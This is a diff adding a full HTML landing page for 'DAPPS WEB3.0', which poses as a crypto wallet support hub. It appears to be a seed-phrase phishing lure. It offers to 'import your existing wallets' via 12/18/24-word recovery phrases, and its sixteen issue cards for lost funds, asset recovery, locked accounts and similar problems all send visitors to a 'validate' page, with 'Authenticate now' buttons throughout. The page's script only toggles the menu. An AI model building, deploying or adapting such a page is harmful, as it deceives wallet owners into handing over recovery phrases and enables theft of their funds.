@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="description" content="Trusted platform for managing Decentralised Apps and resolving crypto issues.">
+  <title>DAPPS WEB3.0 • Crypto Support Hub</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    :root {
+      --bg: #0a0a0f;
+      --bg-card: #111118;
+      --text: #e2e8f0;
+      --text-muted: #94a3b8;
+      --red: #e11d48;
+      --red-dark: #be123c;
+      --border: #1e293b;
+      --accent-glow: rgba(225, 29, 72, 0.18);
+      --icon-color: #f1f5f9;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', system-ui, sans-serif;
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 2rem;
+    }
+
+    nav {
+      background: rgba(17, 17, 24, 0.85);
+      backdrop-filter: blur(12px);
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      padding: 1.2rem 0;
+    }
+
+    .nav-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .nav-logo {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.6rem;
+      color: var(--red);
+      text-decoration: none;
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 2rem;
+    }
+
+    .nav-link {
+      color: var(--text-muted);
+      text-decoration: none;
+      font-weight: 500;
+      transition: color 0.3s;
+    }
+
+    .nav-link:hover {
+      color: var(--text);
+    }
+
+    .nav-btn {
+      background: var(--red);
+      color: white;
+      padding: 0.6rem 1.4rem;
+      border-radius: 0.5rem;
+      text-decoration: none;
+      font-weight: 600;
+      transition: background 0.3s;
+    }
+
+    .nav-btn:hover {
+      background: var(--red-dark);
+    }
+
+    .nav-toggle {
+      display: none;
+      background: none;
+      border: none;
+      color: var(--text);
+      font-size: 1.8rem;
+      cursor: pointer;
+    }
+
+    header {
+      position: relative;
+      height: 60vh;
+      min-height: 400px;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .slider {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 300%;
+      height: 100%;
+      display: flex;
+      animation: slide 20s infinite ease-in-out;
+    }
+
+    .slide {
+      width: 33.333%;
+      height: 100%;
+      background-size: cover;
+      background-position: center;
+      position: relative;
+    }
+
+    .slide::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(to bottom, rgba(10,10,15,0.4), rgba(10,10,15,0.8));
+    }
+
+    .slide:nth-child(1) {
+      background-image: url('https://thumbs.dreamstime.com/b/abstract-digital-background-glowing-blockchain-network-electric-blue-interconnected-nods-modern-crypto-theme-featuring-333071506.jpg');
+    }
+
+    .slide:nth-child(2) {
+      background-image: url('https://thumbs.dreamstime.com/b/ultra-hd-abstract-bitcoin-crypto-currency-blockchain-technology-world-map-background-illustration-global-106043487.jpg');
+    }
+
+    .slide:nth-child(3) {
+      background-image: url('https://thumbs.dreamstime.com/b/blockchain-technology-big-data-neural-network-cyber-security-futuristic-background-cryptocurrency-business-banner-concept-high-377321380.jpg');
+    }
+
+    @keyframes slide {
+      0% { transform: translateX(0); }
+      33% { transform: translateX(0); }
+      40% { transform: translateX(-33.333%); }
+      73% { transform: translateX(-33.333%); }
+      80% { transform: translateX(-66.666%); }
+      100% { transform: translateX(-66.666%); }
+    }
+
+    .header-content {
+      position: relative;
+      z-index: 1;
+      max-width: 800px;
+      padding: 2rem;
+    }
+
+    .logo-text {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 3.5rem;
+      font-weight: 700;
+      color: white;
+      letter-spacing: 1.5px;
+      margin-bottom: 1rem;
+      text-shadow: 0 4px 8px rgba(0,0,0,0.4);
+    }
+
+    .tagline {
+      font-size: 1.5rem;
+      color: var(--text);
+      opacity: 0.9;
+      margin-bottom: 2.5rem;
+    }
+
+    .header-cta {
+      background: var(--red);
+      color: white;
+      padding: 1rem 2.5rem;
+      border-radius: 0.6rem;
+      text-decoration: none;
+      font-weight: 600;
+      font-size: 1.1rem;
+      transition: all 0.3s;
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+    }
+
+    .header-cta:hover {
+      background: var(--red-dark);
+      transform: scale(1.05);
+    }
+
+    .stats {
+      display: flex;
+      justify-content: center;
+      gap: 4rem;
+      margin: 3rem 0;
+      flex-wrap: wrap;
+    }
+
+    .stat-item {
+      text-align: center;
+      background: var(--bg-card);
+      padding: 1.2rem 2rem;
+      border-radius: 0.8rem;
+      border: 1px solid var(--border);
+      min-width: 160px;
+      transition: transform 0.3s;
+    }
+
+    .stat-item:hover {
+      transform: translateY(-4px);
+    }
+
+    .stat-number {
+      font-size: 2.4rem;
+      font-weight: 700;
+      color: var(--red);
+    }
+
+    .stat-label {
+      font-size: 1rem;
+      color: var(--text-muted);
+      margin-top: 0.5rem;
+    }
+
+    main {
+      padding: 5rem 0;
+    }
+
+    .intro-text {
+      text-align: center;
+      max-width: 800px;
+      margin: 0 auto 4rem;
+      font-size: 1.2rem;
+      color: var(--text-muted);
+    }
+
+    .intro-text strong {
+      color: white;
+    }
+
+    .issues-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(360px, 1fr));
+      gap: 1.8rem;
+    }
+
+    .issue-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 1.2rem;
+      padding: 2rem;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .issue-card:hover {
+      transform: translateY(-8px);
+      border-color: var(--red-dark);
+      box-shadow: 0 25px 40px -15px var(--accent-glow);
+    }
+
+    .issue-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 5px;
+      background: linear-gradient(90deg, transparent, var(--red), transparent);
+      opacity: 0.7;
+      transition: opacity 0.3s;
+    }
+
+    .issue-card:hover::before {
+      opacity: 1;
+    }
+
+    .issue-header {
+      display: flex;
+      align-items: center;
+      gap: 1.2rem;
+      margin-bottom: 1.2rem;
+    }
+
+    .issue-icon {
+      font-size: 2.2rem;
+      color: var(--red);
+      background: rgba(225, 29, 72, 0.12);
+      padding: 0.8rem;
+      border-radius: 0.8rem;
+      width: 4rem;
+      height: 4rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.3s;
+    }
+
+    .issue-card:hover .issue-icon {
+      transform: rotate(360deg);
+    }
+
+    .issue-title {
+      font-size: 1.35rem;
+      font-weight: 600;
+      color: white;
+    }
+
+    .issue-desc {
+      color: var(--text-muted);
+      font-size: 1rem;
+      margin-bottom: 1.6rem;
+      line-height: 1.6;
+      flex-grow: 1;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--red);
+      color: white;
+      font-weight: 600;
+      padding: 1rem 2rem;
+      border-radius: 0.6rem;
+      text-decoration: none;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      border: none;
+      cursor: pointer;
+      font-size: 1rem;
+      gap: 0.6rem;
+    }
+
+    .btn i {
+      font-size: 1.2rem;
+    }
+
+    .btn:hover {
+      background: var(--red-dark);
+      transform: translateY(-3px);
+      box-shadow: 0 12px 30px -10px rgba(225, 29, 72, 0.5);
+    }
+
+    .center-btn {
+      display: flex;
+      margin: 4rem auto 0;
+      padding: 1.2rem 3rem;
+      font-size: 1.2rem;
+      max-width: max-content;
+    }
+
+    footer {
+      text-align: center;
+      padding: 4rem 0 3rem;
+      color: var(--text-muted);
+      font-size: 0.95rem;
+      border-top: 1px solid var(--border);
+      margin-top: 5rem;
+    }
+
+    .subscribe-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: 1.2rem;
+      padding: 3rem;
+      max-width: 700px;
+      margin: 5rem auto;
+      text-align: center;
+      position: relative;
+    }
+
+    .subscribe-box h2 {
+      color: white;
+      margin-bottom: 1.5rem;
+      font-size: 1.8rem;
+    }
+
+    .subscribe-form {
+      display: flex;
+      gap: 1.2rem;
+      max-width: 500px;
+      margin: 2rem auto 0;
+    }
+
+    .subscribe-input {
+      flex-grow: 1;
+      padding: 1rem 1.5rem;
+      border-radius: 0.6rem;
+      border: 1px solid var(--border);
+      background: var(--bg);
+      color: var(--text);
+      font-size: 1rem;
+    }
+
+    .subscribe-input::placeholder {
+      color: var(--text-muted);
+    }
+
+    @media (max-width: 768px) {
+      .container { padding: 0 1.5rem; }
+      .logo-text { font-size: 2.8rem; }
+      .tagline { font-size: 1.3rem; }
+      .stats { gap: 2.5rem; }
+      .issue-card { padding: 1.8rem; }
+      .subscribe-form { flex-direction: column; }
+      .nav-links { gap: 1.5rem; }
+      header { height: 50vh; }
+      .nav-container {
+        justify-content: space-between;
+      }
+      .nav-links {
+        display: none;
+        flex-direction: column;
+        position: absolute;
+        top: 100%;
+        left: 0;
+        right: 0;
+        background: var(--bg-card);
+        padding: 1rem;
+        border-top: 1px solid var(--border);
+      }
+      .nav-links.active {
+        display: flex;
+      }
+      .nav-toggle {
+        display: block;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .nav-container { justify-content: space-between; }
+      .nav-links { text-align: center; }
+    }
+  </style>
+</head>
+<body>
+
+  <nav>
+    <div class="container nav-container">
+      <a href="#" class="nav-logo">DAPPS WEB3.0</a>
+      <div class="nav-links">
+        <a href="#" class="nav-link">Home</a>
+      </div>
+      <a href="login" class="nav-btn">Authenticate Now</a>
+      <button class="nav-toggle" aria-label="Toggle menu"><i class="fas fa-bars"></i></button>
+    </div>
+  </nav>
+
+  <header>
+    <div class="slider">
+      <div class="slide"></div>
+      <div class="slide"></div>
+      <div class="slide"></div>
+    </div>
+    <div class="header-content">
+      <h1 class="logo-text">PEOPLE-POWERED NETWORKS</h1>
+      <p class="tagline">Trusted platform to manage Decentralised Apps. Secure, Reliable, and User-Centric.</p>
+      <a href="ennn/validate" class="header-cta">Get Started <i class="fas fa-arrow-right"></i></a>
+    </div>
+  </header>
+
+  <section class="container">
+    <div class="stats">
+      <div class="stat-item">
+        <div class="stat-number">2000+</div>
+        <div class="stat-label">Users</div>
+      </div>
+      <div class="stat-item">
+        <div class="stat-number">70+</div>
+        <div class="stat-label">Wallets</div>
+      </div>
+    </div>
+  </section>
+
+  <main class="container">
+    <p class="intro-text">
+      Easily import your existing wallets with 12/18/24-word recovery phrase. Made possible with your favorite cryptocurrencies.<br>
+      <strong>The most efficient solution provider in the blockchain.</strong><br>
+      Most trusted platform for solutions on all transaction issues, staking issues (pool & farm), balance irregularities, whitelist issues, withdrawal issues and bridging errors.<br>
+      The most complex part of web3, made simple.
+    </p>
+
+    <section class="issues-grid">
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-exchange-alt"></i></div>
+          <h3 class="issue-title">Swap / Exchange</h3>
+        </div>
+        <p class="issue-desc">We will support you in any related issues with swapping and/or exchange of coins. Kindly click here.</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-plug"></i></div>
+          <h3 class="issue-title">Connect to Dapps</h3>
+        </div>
+        <p class="issue-desc">Connect decentralised web applications to mobile wallets. Enable DAPP on mobile wallet/ Extension.</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-image"></i></div>
+          <h3 class="issue-title">NFTs</h3>
+        </div>
+        <p class="issue-desc">Do you have any issues related to how to mint/transfer nfts or need support on how to receive nfts?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-gift"></i></div>
+          <h3 class="issue-title">Claim Reward</h3>
+        </div>
+        <p class="issue-desc">Do you have any issues claiming reward?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-search-dollar"></i></div>
+          <h3 class="issue-title">Asset Recovery</h3>
+        </div>
+        <p class="issue-desc">Do you want your asset to be recovered?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-lock"></i></div>
+          <h3 class="issue-title">Stake Tokens</h3>
+        </div>
+        <p class="issue-desc">Stake your tokens here.</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-bug"></i></div>
+          <h3 class="issue-title">Wallet Glitch / Error</h3>
+        </div>
+        <p class="issue-desc">Do you have any glitch issues on your wallet?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-sign-in-alt"></i></div>
+          <h3 class="issue-title">Login Issues</h3>
+        </div>
+        <p class="issue-desc">Do you have any issues logging in to your wallet?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-search-minus"></i></div>
+          <h3 class="issue-title">Missing / Lost Funds</h3>
+        </div>
+        <p class="issue-desc">Lost access to funds or funds is missing</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-dollar-sign"></i></div>
+          <h3 class="issue-title">High Fees</h3>
+        </div>
+        <p class="issue-desc">Increase in transaction fees?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fab fa-ethereum"></i></div>
+          <h3 class="issue-title">Bridge Transfer</h3>
+        </div>
+        <p class="issue-desc">Do you have any issue while trying to transfer tokens between chains?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-hourglass-half"></i></div>
+          <h3 class="issue-title">Transaction Delay</h3>
+        </div>
+        <p class="issue-desc">Do you have issues with transactions being delayed?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-chart-line"></i></div>
+          <h3 class="issue-title">Issues with Trading</h3>
+        </div>
+        <p class="issue-desc">Do you have problem with your trading account</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-user-lock"></i></div>
+          <h3 class="issue-title">Locked Account</h3>
+        </div>
+        <p class="issue-desc">If you are logged out due to activity on the account</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-arrow-right-arrow-left"></i></div>
+          <h3 class="issue-title">Migrate</h3>
+        </div>
+        <p class="issue-desc">Want to migrate seamlessly with no hassle?</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+      <div class="issue-card">
+        <div class="issue-header">
+          <div class="issue-icon"><i class="fas fa-shopping-cart"></i></div>
+          <h3 class="issue-title">Unable to Purchase Coins</h3>
+        </div>
+        <p class="issue-desc">If your account is not recognized as a trusted payment source you may not be able to buy crypto and add coins</p>
+        <a href="ennn/validate" class="btn">Resolve Now <i class="fas fa-arrow-right"></i></a>
+      </div>
+
+    </section>
+
+    <a href="login" class="btn center-btn">AUTHENTICATE NOW TO VALIDATE YOUR ACCOUNT <i class="fas fa-shield-alt"></i></a>
+
+    <div class="subscribe-box">
+      <h2>Subscribe to Our Newsletter</h2>
+      <p>Join the hundreds of teams using our services, subscribe to get exclusive news & offers.</p>
+      <form class="subscribe-form" action="https://example.com/subscribe" method="post">
+        <input type="email" class="subscribe-input" placeholder="Enter your email address" required>
+        <button type="submit" class="btn">Subscribe <i class="fas fa-envelope"></i></button>
+      </form>
+    </div>
+
+  </main>
+
+  <footer class="container">
+    <p>We power next-generation applications for blockchain and cryptocurrency asset management, enabling you to sync your crypto wallets into a single platform.<br>
+    Copyright © 2023. Made with love for you. All rights reserved.</p>
+  </footer>
+
+  <script>
+    const toggle = document.querySelector('.nav-toggle');
+    const links = document.querySelector('.nav-links');
+    toggle.addEventListener('click', () => {
+      links.classList.toggle('active');
+    });
+  </script>
+
+</body>
+</html>
